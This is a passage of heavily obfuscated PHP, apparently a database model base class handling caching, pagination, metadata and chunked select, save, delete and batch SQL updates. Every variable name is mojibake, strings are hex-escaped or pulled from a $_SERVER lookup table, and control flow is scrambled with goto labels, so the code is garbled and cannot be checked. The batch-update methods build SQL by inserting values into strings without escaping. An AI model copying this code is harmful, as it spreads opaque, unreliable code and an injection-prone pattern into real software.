&$aÉÏßù¥ä¾) { $this->dataAfterFilter($aÉÏßù¥ä¾); } } protected function _afterFind(&$a°ïã‰ÀÔ¹, $f£Œîİ±İÖ) { if (!is_array($a°ïã‰ÀÔ¹)) { return; } if (!$this->checkDataAutoHas($_SERVER[‚Ğ°–—î][346])) { return; } $this->dataAfterFilter($a°ïã‰ÀÔ¹); } public function setAutoIncrement($E¶¤öóâ‘§) { $dÚ»‡ÍÍè“ = array($this->getPk() => $E¶¤öóâ‘§); $D ²ĞÍÚšÚ = $this->data($dÚ»‡ÍÍè“)->add(); if ($D ²ĞÍÚšÚ) { $this->delete($D ²ĞÍÚšÚ); } } public function getAutoIncrement() { $C× ¾ê³ß‰ = $this->getTableName(); $F²Š²–ï§å = $this->max($this->getPk()); $B‰™¬ÙÙö = $this->query("\x73\x68\157\167\40\164\x61\142\154\145\x20\x73\164\141\x74\165\x73\40\x77\x68\145\x72\x65\x20\x4e\141\155\x65\75\47{$C× ¾ê³ß‰}\x27"); $Cß£…‚Œá = $B‰™¬ÙÙö[0][$_SERVER[‚Ğ°–—î][347]]; $fÔÂÒÙ„® = max($F²Š²–ï§å, $Cß£…‚Œá); return $fÔÂÒÙ„®; } protected function _callBefore($BÄ–ĞÙÀæƒ, $EÊİøŸ™İ) { return $this->cacheCallCheck($BÄ–ĞÙÀæƒ, $EÊİøŸ™İ, !1); } protected function _callAfter($Fù…éŞ´ªÅ, $c®“Ëëä´ù) { return $this->cacheCallCheck($Fù…éŞ´ªÅ, $c®“Ëëä´ù, !0); } protected function cacheFunctionAlias($EòçÀëõÌš) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($d±’óËïš×, $eëÒØøªê, $dĞ¶íç¤ = false) { $DíÌñ¯“Éà = $this->cacheFunctionAlias($eëÒØøªê); if (!$DíÌñ¯“Éà) { return; } foreach ($DíÌñ¯“Éà as $eŸ¡ª¬ª§ => $BÇãùáÃ‰Š) { $f–Ğ½œ²×Ä = $BÇãùáÃ‰Š[0]; $A¼¯Ä‹â›° = explode($_SERVER[‚Ğ°–—î][47], $BÇãùáÃ‰Š[1]); if ($d±’óËïš× == $eŸ¡ª¬ª§) { return $this->cacheFunctionGet($eŸ¡ª¬ª§, $f–Ğ½œ²×Ä); } if ($dĞ¶íç¤ && in_array($d±’óËïš×, $A¼¯Ä‹â›°)) { $this->cacheFunctionClear($eŸ¡ª¬ª§, $f–Ğ½œ²×Ä); } } } public function cacheFunctionGet($DÊÉÈ¡ ÷Ë, $FÉï¤”‘Ş) { $C…å–åÅìÉ = $this->cacheKeyMake($DÊÉÈ¡ ÷Ë, $FÉï¤”‘Ş); $e¼´µ™È°Š = Cache::get($C…å–åÅìÉ); if (!is_array($e¼´µ™È°Š)) { $e¼´µ™È°Š = call_user_func_array(array($this, $DÊÉÈ¡ ÷Ë), array($FÉï¤”‘Ş, !0)); Cache::set($C…å–åÅìÉ, $e¼´µ™È°Š); } return $e¼´µ™È°Š; } public function cacheFunctionClear($B¨»‚ã¡Şß, $eë¬¯„»˜‡) { $fÚ˜ù•Ö“˜ = $eë¬¯„»˜‡; if (!is_array($eë¬¯„»˜‡)) { $fÚ˜ù•Ö“˜ = array($eë¬¯„»˜‡); } foreach ($fÚ˜ù•Ö“˜ as $eßŸâíÙé) { $CÀé÷£˜‘ = $this->cacheKeyMake($B¨»‚ã¡Şß, $eßŸâíÙé); Cache::remove($CÀé÷£˜‘); } } private function cacheKeyMake($c¶â“ï£¯¶, $Cù‹ÇæÉ) { $f†¹Î¶¾Ôç =& $_SERVER[‚Ğ°–—î]; return get_class($this) . $f†¹Î¶¾Ôç[70] . $c¶â“ï£¯¶ . $f†¹Î¶¾Ôç[348] . $Cù‹ÇæÉ; } protected function selectPage($C·ÊÃ™Î´ = 200, $EÊªÎ–®‚˜ = 1) { goto B†áÁä„½˜; B†áÁä„½˜: $AÍ¥¸Ãå± =& $_SERVER[‚Ğ°–—î]; global $in; $AÒÖ÷‘©ËÊ = $this->optionsValue(); goto bÊù«¼…Í; f™¯Äé¸Âô: $eçŒ¥“ÏĞğ = ceil($e†óôÎÄŞ¦ / $C·ÊÃ™Î´); $EÊªÎ–®‚˜ = intval(isset($in[$AÍ¥¸Ãå±[340]]) ? $in[$AÍ¥¸Ãå±[340]] : $EÊªÎ–®‚˜); $EÊªÎ–®‚˜ = $EÊªÎ–®‚˜ <= 1 ? 1 : ($EÊªÎ–®‚˜ >= $eçŒ¥“ÏĞğ ? $eçŒ¥“ÏĞğ : $EÊªÎ–®‚˜); goto C¤í³ÊŸØè; f«ùß§ºöÇ: if ($eçŒ¥“ÏĞğ == 1) { $e†óôÎÄŞ¦ = count($cùŠ©£¥§Ø); } $B×ßÉ¬Éç— = array($AÍ¥¸Ãå±[351] => array($AÍ¥¸Ãå±[352] => $e†óôÎÄŞ¦, $AÍ¥¸Ãå±[349] => $C·ÊÃ™Î´, $AÍ¥¸Ãå±[340] => $EÊªÎ–®‚˜, $AÍ¥¸Ãå±[353] => $eçŒ¥“ÏĞğ), $AÍ¥¸Ãå±[354] => $cùŠ©£¥§Ø ? $cùŠ©£¥§Ø : array()); return $B×ßÉ¬Éç—; goto C†Ìó˜¹ÕØ; eà¶šê¼“ì: $e†óôÎÄŞ¦ = intval($this->count()); $C·ÊÃ™Î´ = intval($C·ÊÃ™Î´); $C·ÊÃ™Î´ = $C·ÊÃ™Î´ <= 5 ? 5 : ($C·ÊÃ™Î´ >= $D‰‰ˆõø‘Ÿ ? $D‰‰ˆõø‘Ÿ : $C·ÊÃ™Î´); goto f™¯Äé¸Âô; Eêõ£íÊÌ‹: $EÍƒÚÜÁ•Ì = $AÒÖ÷‘©ËÊ; $EÍƒÚÜÁ•Ì[$AÍ¥¸Ãå±[350]] = array(); $this->optionsValue($EÍƒÚÜÁ•Ì); goto eà¶šê¼“ì; bÊù«¼…Í: $D‰‰ˆõø‘Ÿ = 4000; $C·ÊÃ™Î´ = isset($in[$AÍ¥¸Ãå±[349]]) ? $in[$AÍ¥¸Ãå±[349]] : $C·ÊÃ™Î´; if ($C·ÊÃ™Î´ === -1) { unset($in[$AÍ¥¸Ãå±[349]]); $D‰‰ˆõø‘Ÿ = 100000000; $C·ÊÃ™Î´ = $D‰‰ˆõø‘Ÿ; } goto Eêõ£íÊÌ‹; C¤í³ÊŸØè: $this->optionsValue($AÒÖ÷‘©ËÊ); $cùŠ©£¥§Ø = $this->page($EÊªÎ–®‚˜, $C·ÊÃ™Î´)->select(); $cùŠ©£¥§Ø = is_array($cùŠ©£¥§Ø) ? $cùŠ©£¥§Ø : array(); goto f«ùß§ºöÇ; C†Ìó˜¹ÕØ: } protected function checkLength($BÉº¤Èôáâ, $fõ—•ÒÓ’Ù = 0, $cã„ÏÓÎÅŠ = '') { $a›Éï£Üõ =& $_SERVER[‚Ğ°–—î]; $fõ—•ÒÓ’Ù = $fõ—•ÒÓ’Ù ? $fõ—•ÒÓ’Ù : 65536; if (!$BÉº¤Èôáâ || strlen($BÉº¤Èôáâ) < $fõ—•ÒÓ’Ù) { return; } $cã„ÏÓÎÅŠ = $cã„ÏÓÎÅŠ ? $cã„ÏÓÎÅŠ . $a›Éï£Üõ[67] : $a›Éï£Üõ[33]; show_json($cã„ÏÓÎÅŠ . LNG($a›Éï£Üõ[355]) . "\x28{$fõ—•ÒÓ’Ù}\51", !1); } protected function metaSet($A§Î²óâõ, $EÈ‡Ó´ÍÏ¾ = null, $EÂ±å…Ù = null) { goto dèè‹Õƒ; fùš¬õ¢°‹: if (is_string($EÈ‡Ó´ÍÏ¾)) { $dØóæä„î[$EÈ‡Ó´ÍÏ¾] = $EÂ±å…Ù; } $C¿£‘µ„® = array(); foreach ($dØóæä„î as $D‘¢¢®Áé¶ => $eò½é‚õÖ„) { $this->checkLength($eò½é‚õÖ„, !1, $D›Éíõ¼àÈ . $F•ğíîÎÕ£[4] . $D‘¢¢®Áé¶); $C¿£‘µ„®[] = array($AŠØ¶±²Æ => $A§Î²óâõ, $F•ğíîÎÕ£[89] => $D‘¢¢®Áé¶, $F•ğíîÎÕ£[359] => $eò½é‚õÖ„); } goto DÓ…òÔÊÎ„; dèè‹Õƒ: $F•ğíîÎÕ£ =& $_SERVER[‚Ğ°–—î]; if (!$this->tableMeta) { return !1; } $AŠØ¶±²Æ = $this->tableMeta[$F•ğíîÎÕ£[356]]; goto F‡êËÈô; DÓ…òÔÊÎ„: $fà„êèÅƒ->where(array($AŠØ¶±²Æ => $A§Î²óâõ))->addAll($C¿£‘µ„®, array(), !0); return !0; goto CÂ‰¹£ß¦Ï; FäŠãÔœËê: if (is_null($EÈ‡Ó´ÍÏ¾)) { return $fà„êèÅƒ->where(array($AŠØ¶±²Æ => $A§Î²óâõ))->delete(); } if (is_null($EÂ±å…Ù)) { return $fà„êèÅƒ->where($e¬ïº¦õÛ¾)->delete(); } $dØóæä„î = is_array($EÈ‡Ó´ÍÏ¾) ? $EÈ‡Ó´ÍÏ¾ : array(); goto fùš¬õ¢°‹; F‡êËÈô: $D›Éíõ¼àÈ = $this->tableMeta[$F•ğíîÎÕ£[357]]; $fà„êèÅƒ = Model($D›Éíõ¼àÈ); $e¬ïº¦õÛ¾ = array($AŠØ¶±²Æ => $A§Î²óâõ, $F•ğíîÎÕ£[358] => $EÈ‡Ó´ÍÏ¾); goto FäŠãÔœËê; CÂ‰¹£ß¦Ï: } public function metaGet($D‡ˆò¦Ÿå›) { goto EŠ¡œƒˆÇÌ; b†ïÂÈãàê: $fÍ™º”õƒ¼ = Model($this->tableMeta[$e–¶šÂñ÷™[357]]); $FìáÑÅøİ = array($fËÚÚâï‹… => $D‡ˆò¦Ÿå›); $eÙ†Ç›ÅÂ = $fÍ™º”õƒ¼->field($e–¶šÂñ÷™[360])->where($FìáÑÅøİ)->select(); goto F–‹Ø’¸œ‰; F–‹Ø’¸œ‰: $eÙ†Ç›ÅÂ = array_to_keyvalue($eÙ†Ç›ÅÂ, $e–¶šÂñ÷™[89], $e–¶šÂñ÷™[359]); return $eÙ†Ç›ÅÂ; goto cø·õ¬³¡ê; EŠ¡œƒˆÇÌ: $e–¶šÂñ÷™ =& $_SERVER[‚Ğ°–—î]; if (!$this->tableMeta) { return array(); } $fËÚÚâï‹… = $this->tableMeta[$e–¶šÂñ÷™[356]]; goto b†ïÂÈãàê; cø·õ¬³¡ê: } private function checkDataAutoHas($EÖ¨ªìÚ›¸) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $CÁò¾ó¢Æì) { if (in_array($EÖ¨ªìÚ›¸, explode($_SERVER[‚Ğ°–—î][47], $CÁò¾ó¢Æì[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$a‡ã™½º¬„, $A‘Êæİ°¾‚) { $fêí—ä¬ =& $_SERVER[‚Ğ°–—î]; foreach ($this->dataAuto as $BËğ¤Úñ‘†) { $FõÁ…Á³£ = $BËğ¤Úñ‘†[0]; if (!in_array($A‘Êæİ°¾‚, explode($fêí—ä¬[47], $BËğ¤Úñ‘†[2]))) { continue; } switch (trim($BËğ¤Úñ‘†[3])) { case $fêí—ä¬[309]: case $fêí—ä¬[310]: $D¤â˜İ‚Š = $BËğ¤Úñ‘†[1]; $eãîê‹Œ´‡ = isset($BËğ¤Úñ‘†[4]) ? (array) $BËğ¤Úñ‘†[4] : array(); if ($D¤â˜İ‚Š == $fêí—ä¬[190] && array_key_exists($FõÁ…Á³£, $a‡ã™½º¬„)) { if (!$a‡ã™½º¬„[$FõÁ…Á³£]) { unset($a‡ã™½º¬„[$FõÁ…Á³£]); } break; } if (isset($a‡ã™½º¬„[$FõÁ…Á³£])) { array_unshift($eãîê‹Œ´‡, $a‡ã™½º¬„[$FõÁ…Á³£]); } if ($fêí—ä¬[309] == $BËğ¤Úñ‘†[3]) { $a‡ã™½º¬„[$FõÁ…Á³£] = call_user_func_array($D¤â˜İ‚Š, $eãîê‹Œ´‡); } else { $a‡ã™½º¬„[$FõÁ…Á³£] = call_user_func_array(array(&$this, $D¤â˜İ‚Š), $eãîê‹Œ´‡); } break; case $fêí—ä¬[261]: $a‡ã™½º¬„[$FõÁ…Á³£] = $a‡ã™½º¬„[$BËğ¤Úñ‘†[1]]; break; case $fêí—ä¬[282]: if (isset($a‡ã™½º¬„[$FõÁ…Á³£]) && !is_string($a‡ã™½º¬„[$FõÁ…Á³£])) { $a‡ã™½º¬„[$FõÁ…Á³£] = json_encode_force($a‡ã™½º¬„[$FõÁ…Á³£]); } break; case $fêí—ä¬[311]: if ($a‡ã™½º¬„[$FõÁ…Á³£] === $fêí—ä¬[33]) { unset($a‡ã™½º¬„[$FõÁ…Á³£]); } break; case $fêí—ä¬[312]: $a‡ã™½º¬„[$FõÁ…Á³£] = $BËğ¤Úñ‘†[1]; default: break; } } if ($A‘Êæİ°¾‚ == $fêí—ä¬[344]) { $eÉÑó˜É = strtolower($this->db->getDbType()); if (strpos($eÉÑó˜É, $fêí—ä¬[9]) !== 0) { return; } $eØ˜êõÀáŠ = $this->field(!0)->fields; $C¾ÑËÇ¹à = $eØ˜êõÀáŠ[$fêí—ä¬[240]]; if (isset($eØ˜êõÀáŠ[$fêí—ä¬[239]])) { unset($C¾ÑËÇ¹à[$eØ˜êõÀáŠ[$fêí—ä¬[239]]]); } foreach ($C¾ÑËÇ¹à as $cÓŠ‹¨¦¾Œ => $A‘Êæİ°¾‚) { if (!isset($a‡ã™½º¬„[$cÓŠ‹¨¦¾Œ])) { $a‡ã™½º¬„[$cÓŠ‹¨¦¾Œ] = $fêí—ä¬[33]; } } } } private function dataAfterFilter(&$E‰‚ŠÜí–ƒ) { $bíŒóé÷³® =& $_SERVER[‚Ğ°–—î]; foreach ($this->dataAuto as $F›¸ÛõÜùæ) { $eÎåğ…µ¾Š = $F›¸ÛõÜùæ[0]; if (!in_array($bíŒóé÷³®[346], explode($bíŒóé÷³®[47], $F›¸ÛõÜùæ[2]))) { continue; } if (!isset($E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š])) { continue; } switch (trim($F›¸ÛõÜùæ[3])) { case $bíŒóé÷³®[309]: case $bíŒóé÷³®[310]: $f¥  Œâ³ù = isset($F›¸ÛõÜùæ[4]) ? (array) $F›¸ÛõÜùæ[4] : array(); array_unshift($f¥  Œâ³ù, $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š]); if ($bíŒóé÷³®[309] == $F›¸ÛõÜùæ[3]) { $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š] = call_user_func_array($F›¸ÛõÜùæ[1], $f¥  Œâ³ù); } else { $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š] = call_user_func_array(array(&$this, $F›¸ÛõÜùæ[1]), $f¥  Œâ³ù); } break; case $bíŒóé÷³®[261]: $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š] = $E‰‚ŠÜí–ƒ[$F›¸ÛõÜùæ[1]]; break; case $bíŒóé÷³®[282]: $e±œíˆ‘–× = $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š]; $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š] = json_decode($e±œíˆ‘–×, !0); if (is_null($E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š])) { $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š] = $e±œíˆ‘–×; } break; case $bíŒóé÷³®[311]: if ($E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š] === $bíŒóé÷³®[33]) { unset($E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š]); } break; case $bíŒóé÷³®[312]: $E‰‚ŠÜí–ƒ[$eÎåğ…µ¾Š] = $F›¸ÛõÜùæ[1]; default: break; } } } public function saveAll($dß º«æ¥) { goto d‰¿ÙğÔïÏ; d‰¿ÙğÔïÏ: $B®‚…Ü¬ø =& $_SERVER[‚Ğ°–—î]; $A›ÎµÎ¤Îš = $this->tablePrefix . $this->tableName; $BöŸ•’‡Ù» = self::SQL_WHERE_IN_CHUNK; goto FÇÏÂâ‚©Û; FÇÏÂâ‚©Û: $dß º«æ¥ = is_array($dß º«æ¥) ? $dß º«æ¥ : array(); $a·ä‚Ë«Š = $B®‚…Ü¬ø[361]; $fÓóµÁô = 0; goto Eà®İ×ò±; Eà®İ×ò±: $D‚µÁè‡ = array(); $B¾÷‹å›¶œ = count($dß º«æ¥); for ($fÕğ†Ä‘÷¤ = 0; $fÕğ†Ä‘÷¤ < $B¾÷‹å›¶œ; $fÕğ†Ä‘÷¤++) { $cãçÖ²„¹Ü = $dß º«æ¥[$fÕğ†Ä‘÷¤]; if (!is_array($cãçÖ²„¹Ü) || count($cãçÖ²„¹Ü) != 4) { continue; } $FÚš¼ãÊ‰Á = "\x55\120\x44\x41\x54\105\x20\140{$A›ÎµÎ¤Îš}\140\40\x53\105\124\x20{$cãçÖ²„¹Ü[2]}\40\x3d\x20\103\x41\x53\105\x20{$cãçÖ²„¹Ü[0]}\x20\12"; if ($fÓóµÁô == 0) { $a·ä‚Ë«Š = $FÚš¼ãÊ‰Á; } $D‚µÁè‡[] = $B®‚…Ü¬ø[113] . $cãçÖ²„¹Ü[1] . $B®‚…Ü¬ø[113]; $fÓóµÁô++; $a·ä‚Ë«Š .= "\40\x57\110\105\x4e\x20\x27{$cãçÖ²„¹Ü[1]}\x27\x20\x54\x48\x45\116\x20\47{$cãçÖ²„¹Ü[3]}\x27\40\xa"; if ($fÓóµÁô == $BöŸ•’‡Ù» || $fÕğ†Ä‘÷¤ == $B¾÷‹å›¶œ - 1) { goto fš»ÁíÜ; Fë›ßôˆ‹˜: $D‚µÁè‡ = array(); goto BïİìØ‡‰·; fš»ÁíÜ: $eŒáÏÀË¡ø = implode($B®‚…Ü¬ø[47], $D‚µÁè‡); $a·ä‚Ë«Š .= "\x20\x45\x4e\x44\x20\x20\127\x48\x45\122\105\40{$cãçÖ²„¹Ü[0]}\x20\111\116\x20\x28{$eŒáÏÀË¡ø}\51\40"; $this->execute($a·ä‚Ë«Š); goto EÖéà½±Ø; EÖéà½±Ø: $fÓóµÁô = 0; $a·ä‚Ë«Š = $FÚš¼ãÊ‰Á; $this->chunkEventCheck(count($D‚µÁè‡)); goto Fë›ßôˆ‹˜; BïİìØ‡‰·: } } goto EÏÈ­ÁÓ‹; EÏÈ­ÁÓ‹: $this->chunkEventSet(); goto Bµ¯“ğÊĞğ; Bµ¯“ğÊĞğ: } public function saveAllEach($d°Ç•«…æ) { $bµ®²µ³ =& $_SERVER[‚Ğ°–—î]; $b‹ˆÂ†÷ö = $this->tablePrefix . $this->tableName; foreach ($d°Ç•«…æ as $e£ÅƒÌŞÏ¸) { if (!is_array($e£ÅƒÌŞÏ¸) || count($e£ÅƒÌŞÏ¸) != 4) { continue; } $cƒÄÅ£ƒ„µ = $e£ÅƒÌŞÏ¸[0] . $bµ®²µ³[362] . $e£ÅƒÌŞÏ¸[1] . $bµ®²µ³[113]; $Dº–§àƒò† = $e£ÅƒÌŞÏ¸[2] . $bµ®²µ³[362] . $e£ÅƒÌŞÏ¸[3] . $bµ®²µ³[113]; $b‰›´ŸÓ = "\x75\x70\144\141\x74\145\x20{$b‹ˆÂ†÷ö}\40\x73\145\x74\x20{$Dº–§àƒò†}\x20\x77\x68\145\162\145\40{$cƒÄÅ£ƒ„µ}\73"; $this->execute($b‰›´ŸÓ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($FÏ†ÃîßÎ« = false, $B½õèÁ÷ä = false) { $this->_chunkEvent = $FÏ†ÃîßÎ«; $this->_chunkEventParam = $B½õèÁ÷ä; } private function chunkEventCheck($D•‡Âå†¹‹) { if (!$this->_chunkEvent) { return; } $Cö×¾¹ÌÓ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Cö×¾¹ÌÓ[$_SERVER[‚Ğ°–—î][363]] = $D•‡Âå†¹‹; Hook::trigger($this->_chunkEvent, $Cö×¾¹ÌÓ); } public function addAll($eîİÙÆ‚‹Ë, $bÎ–‡ÆÑ§ƒ = array(), $aè¾”×ß– = false) { goto cÕ¡Èæ•…É; E”Ë¢¤Ñí‰: if (method_exists($this->db, $a¶¦Ùø˜÷ß[260])) { for ($f¨¹àÀã = 0; $f¨¹àÀã < count($eîİÙÆ‚‹Ë); $f¨¹àÀã += $F†“²éÒÜ) { $eÓİ¥¤’§ = array_slice($eîİÙÆ‚‹Ë, $f¨¹àÀã, $F†“²éÒÜ); if (!is_array($eÓİ¥¤’§) || count($eÓİ¥¤’§) == 0) { break; } $fõËÕ¾Ê‹‰ = $this->db->insertAll($eÓİ¥¤’§, $bÎ–‡ÆÑ§ƒ, $aè¾”×ß–); $this->chunkEventCheck(count($eÓİ¥¤’§)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eîİÙÆ‚‹Ë as $eÖÁŒ×ÉˆŒ => $EÜãÕØ†ÎÂ) { $fõËÕ¾Ê‹‰ = $this->db->insert($EÜãÕØ†ÎÂ, $bÎ–‡ÆÑ§ƒ, $aè¾”×ß–); } $this->commit(); } if (!1 !== $fõËÕ¾Ê‹‰) { $c®Şå¾õá = $this->getLastInsID(); if ($c®Şå¾õá) { return $c®Şå¾õá; } } return $fõËÕ¾Ê‹‰; goto C“…°°‰æ; aÛ–‡ƒ…­ª: if (empty($eîİÙÆ‚‹Ë)) { $this->error = think_lang($a¶¦Ùø˜÷ß[259]); return !1; } $bÎ–‡ÆÑ§ƒ = $this->_parseOptions($bÎ–‡ÆÑ§ƒ); foreach ($eîİÙÆ‚‹Ë as $eÖÁŒ×ÉˆŒ => $EÜãÕØ†ÎÂ) { $eîİÙÆ‚‹Ë[$eÖÁŒ×ÉˆŒ] = $this->_facade($EÜãÕØ†ÎÂ); $this->_beforeInsert($eîİÙÆ‚‹Ë[$eÖÁŒ×ÉˆŒ], $bÎ–‡ÆÑ§ƒ); } goto E”Ë¢¤Ñí‰; cÕ¡Èæ•…É: $a¶¦Ùø˜÷ß =& $_SERVER[‚Ğ°–—î]; ignore_timeout(); $F†“²éÒÜ = self::SQL_WHERE_IN_CHUNK; goto aÛ–‡ƒ…­ª; C“…°°‰æ: } public function save($EÕáŠáÃÂ´ = '', $fš¹¡¬Ñ’Æ = array()) { goto e³¿‘±ÅåÕ; e³¿‘±ÅåÕ: $d‡¦µ×÷± =& $_SERVER[‚Ğ°–—î]; $bĞ½·â™Ã¹ = self::SQL_WHERE_IN_CHUNK; $aÒáÀˆ‹›ê = $this->optionsValue(); goto b“‚•ÆÆö; CË¬¶í¾½: $e¤ƒ†‚Å¢Ç = $aÒáÀˆ‹›ê[$d‡¦µ×÷±[263]][$d¿Àùç¦”é][1]; $e¤ƒ†‚Å¢Ç = is_array($e¤ƒ†‚Å¢Ç) ? $e¤ƒ†‚Å¢Ç : array(); $b¹‡ØœÙƒí = count($e¤ƒ†‚Å¢Ç); goto dáÃ¢—â¯; b“‚•ÆÆö: $d¿Àùç¦”é = $this->findWhereField($aÒáÀˆ‹›ê); if (!$d¿Àùç¦”é) { return parent::save($EÕáŠáÃÂ´, $fš¹¡¬Ñ’Æ); } $Aƒ„÷‰ÓÅÔ = 0; goto CË¬¶í¾½; dáÃ¢—â¯: for ($e­ÈçàÖò§ = 0; $e­ÈçàÖò§ < $b¹‡ØœÙƒí; $e­ÈçàÖò§ += $bĞ½·â™Ã¹) { $cë›Ñ Ç¸² = array_slice($e¤ƒ†‚Å¢Ç, $e­ÈçàÖò§, $bĞ½·â™Ã¹); if (!is_array($cë›Ñ Ç¸²) || count($cë›Ñ Ç¸²) == 0) { break; } $aÒáÀˆ‹›ê[$d‡¦µ×÷±[263]][$d¿Àùç¦”é][1] = $cë›Ñ Ç¸²; $this->optionsValue($aÒáÀˆ‹›ê); $Aƒ„÷‰ÓÅÔ += parent::save($EÕáŠáÃÂ´, $fš¹¡¬Ñ’Æ); $this->chunkEventCheck(count($cë›Ñ Ç¸²)); } $this->chunkEventSet(); return $Aƒ„÷‰ÓÅÔ; goto dÛÛß’÷Ïõ; dÛÛß’÷Ïõ: } public function add($D¬›ñ²§§ = '', $c‰æçÙÃä = array(), $FÍÅöÅÅ” = false) { if ($this->addTaskStatus && is_array($D¬›ñ²§§)) { $this->addTaskData[] = $D¬›ñ²§§; return; } return parent::add($D¬›ñ²§§, $c‰æçÙÃä, $FÍÅöÅÅ”); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($CÀÃëŒ˜™ = array()) { goto f¬•ÀŞºÑ; E×á¸æÎ‹•: return $f¸éÄÎ§Æî; goto B‹óóåª—; f¬•ÀŞºÑ: $A¨¾÷â‰× =& $_SERVER[‚Ğ°–—î]; $Dõ‡¥Ëª = self::SQL_WHERE_IN_CHUNK; $Eô·ŠéŸî = $this->optionsValue(); goto A‡²²Ş¼„Ü; A‡²²Ş¼„Ü: $aãµ…åä™¬ = $this->findWhereField($Eô·ŠéŸî); if (!$aãµ…åä™¬ || isset($Eô·ŠéŸî[$A¨¾÷â‰×[280]]) || isset($Eô·ŠéŸî[$A¨¾÷â‰×[340]])) { return parent::select($CÀÃëŒ˜™); } $cİÛ´–ˆë = $Eô·ŠéŸî[$A¨¾÷â‰×[263]][$aãµ…åä™¬][1]; goto dôÀŠ‘’Û¥; dôÀŠ‘’Û¥: $cİÛ´–ˆë = is_array($cİÛ´–ˆë) ? $cİÛ´–ˆë : array(); $f¸éÄÎ§Æî = null; for ($C“—®¹¯õ = 0; $C“—®¹¯õ < count($cİÛ´–ˆë); $C“—®¹¯õ += $Dõ‡¥Ëª) { $bÃ´ãÒì¦µ = array_slice($cİÛ´–ˆë, $C“—®¹¯õ, $Dõ‡¥Ëª); if (!is_array($bÃ´ãÒì¦µ) || count($bÃ´ãÒì¦µ) == 0) { break; } $Eô·ŠéŸî[$A¨¾÷â‰×[263]][$aãµ…åä™¬][1] = $bÃ´ãÒì¦µ; $this->optionsValue($Eô·ŠéŸî); $dœ¿ßÀ •ï = parent::select($CÀÃëŒ˜™); if (!$dœ¿ßÀ •ï) { continue; } if (is_null($f¸éÄÎ§Æî)) { $f¸éÄÎ§Æî = array(); } $f¸éÄÎ§Æî = array_merge($f¸éÄÎ§Æî, $dœ¿ßÀ •ï); } goto E×á¸æÎ‹•; B‹óóåª—: } public function delete($Fó …¤Ó„ = array()) { goto B‡œ¢ğÆ¸£; eÇÎ´¸Ï‘Ÿ: return $f½¼ª´éÇ; goto dÚ“Ñœ¡œ; b²ò»Ù«·³: $bÜÜ†ñ¦Ÿö = $f¼ğå„ò®Ò[$eÆŸ‰™»ÃÈ[263]][$A¨ÕÖÕôª»][1]; $bÜÜ†ñ¦Ÿö = is_array($bÜÜ†ñ¦Ÿö) ? $bÜÜ†ñ¦Ÿö : array(); for ($då‰Á¨¹‡â = 0; $då‰Á¨¹‡â < count($bÜÜ†ñ¦Ÿö); $då‰Á¨¹‡â += $fòÂéšÁÍ) { $Eµç÷ÌËÉ¡ = array_slice($bÜÜ†ñ¦Ÿö, $då‰Á¨¹‡â, $fòÂéšÁÍ); if (!is_array($Eµç÷ÌËÉ¡) || count($Eµç÷ÌËÉ¡) == 0) { break; } $f¼ğå„ò®Ò[$eÆŸ‰™»ÃÈ[263]][$A¨ÕÖÕôª»][1] = $Eµç÷ÌËÉ¡; $this->optionsValue($f¼ğå„ò®Ò); $f½¼ª´éÇ += parent::delete($Fó …¤Ó„); } goto eÇÎ´¸Ï‘Ÿ; A¡ØÆ’Øª¼: $A¨ÕÖÕôª» = $this->findWhereField($f¼ğå„ò®Ò); if (!$A¨ÕÖÕôª») { return parent::delete($Fó …¤Ó„); } $f½¼ª´éÇ = 0; goto b²ò»Ù«·³; B‡œ¢ğÆ¸£: $eÆŸ‰™»ÃÈ =& $_SERVER[‚Ğ°–—î]; $fòÂéšÁÍ = self::SQL_WHERE_IN_CHUNK; $f¼ğå„ò®Ò = $this->optionsValue(); goto A¡ØÆ’Øª¼; dÚ“Ñœ¡œ: } private function findWhereField($dª§ñˆÔ£ß) { $CÏõğçç¸ =& $_SERVER[‚Ğ°–—î]; $EŞò‡¥„ÛÑ = self::SQL_WHERE_IN_CHUNK; if (!is_array($dª§ñˆÔ£ß) || !is_array($dª§ñˆÔ£ß[$CÏõğçç¸[263]])) { return !1; } foreach ($dª§ñˆÔ£ß[$CÏõğçç¸[263]] as $eªâù°ë® => $b‹¡’õŠŒ) { if (is_array($b‹¡’õŠŒ) && isset($b‹¡’õŠŒ[0]) && is_string($b‹¡’õŠŒ[0]) && strtolower($b‹¡’õŠŒ[0]) == $CÏõğçç¸[7] && is_array($b‹¡’õŠŒ[1]) && count($b‹¡’õŠŒ[1]) > $EŞò‡¥„ÛÑ) { ignore_timeout(); return $eªâù°ë®; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\155\117\x70\x74\x69\157\156"; public $field = array(); public function listData($CÕà¤˜º‡ = false, $F‚—øà» = "\x6d\157\x64\151\146\171\124\151\155\x65", $b˜„ŠßÊçá = false) { $b²áô”Õ¶ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$b²áô”Õ¶) { return $CÕà¤˜º‡ ? null : array(); } if (!$CÕà¤˜º‡) { $b²áô”Õ¶ = array_filter(array_values($b²áô”Õ¶)); return array_sort_by($b²áô”Õ¶, $F‚—øà», $b˜„ŠßÊçá); } return $b²áô”Õ¶[$_SERVER[‚Ğ°–—î][364] . $CÕà¤˜º‡]; } public function insert($A–÷¨ ‚“¦) { goto fˆğ©³ í¥; fˆğ©³ í¥: 